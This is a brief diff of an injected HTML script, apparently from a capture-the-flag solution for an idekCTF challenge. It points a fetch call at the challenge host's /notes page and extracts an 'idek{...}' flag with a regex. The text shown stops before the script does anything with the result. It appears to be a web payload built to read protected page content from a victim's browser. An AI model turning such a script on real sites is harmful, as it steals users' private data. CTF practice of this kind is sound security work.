@@ -1,5 +1,5 @@
 <script>
-fetch("http://web:3000/notes")
+fetch("http://fnotes-web.ctf-chal.idek.team/notes")
   .then(r => r.text())
   .then(t => {
     const f = t.match(/idek\{.*?\}/);
